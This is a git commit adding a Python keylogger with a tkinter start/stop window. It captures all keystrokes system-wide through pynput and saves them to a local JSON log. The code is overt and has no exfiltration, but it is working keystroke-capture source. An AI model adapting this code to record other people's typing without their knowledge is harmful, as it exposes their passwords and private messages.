aa663a3e0e4b7029d1816adda9e0320953fe0ef9
Aksh Darji <akshdarji2019@gmail.com>
2023-06-26 11:44:51 +0530

    GUI of keylogger is added along with requirement.txt file

---
+++ GUI_Keylogger/GUI_Keylogger.py
@@ -0,0 +1,59 @@
+from tkinter import Tk, Label, Button
+from pynput import keyboard
+import json
+
+key_list = []
+x = False
+key_strokes = None
+listener = None
+
+def update_json_file(key_list):
+    with open('logs.json', 'w') as key_log:
+        json.dump(key_list, key_log)
+
+def on_press(key):
+    global x, key_list
+    if x == False:
+        key_list.append({'Pressed': f'{key}'})
+        x = True
+    if x == True:
+        key_list.append({'Held': f'{key}'})
+    update_json_file(key_list)
+
+def on_release(key):
+    global x, key_list, key_strokes
+    key_list.append({'Released': f'{key}'})
+    if x == True:
+        x = False
+    update_json_file(key_list)
+
+def start_keylogger():
+    global listener
+    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+    listener.start()
+    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'logs.json'")
+    start_button.config(state='disabled')
+    stop_button.config(state='normal')
+
+def stop_keylogger():
+    global listener
+    listener.stop()
+    label.config(text="Keylogger stopped.")
+    start_button.config(state='normal')
+    stop_button.config(state='disabled')
+
+root = Tk()
+root.title("Keylogger")
+
+label = Label(root, text="Click Start to begin keylogging.")
+label.pack()
+
+start_button = Button(root, text="Start", command=start_keylogger)
+start_button.pack()
+
+stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
+stop_button.pack()
+
+root.geometry("300x110")  # Set the window size to 300x110 pixels
+
+root.mainloop()
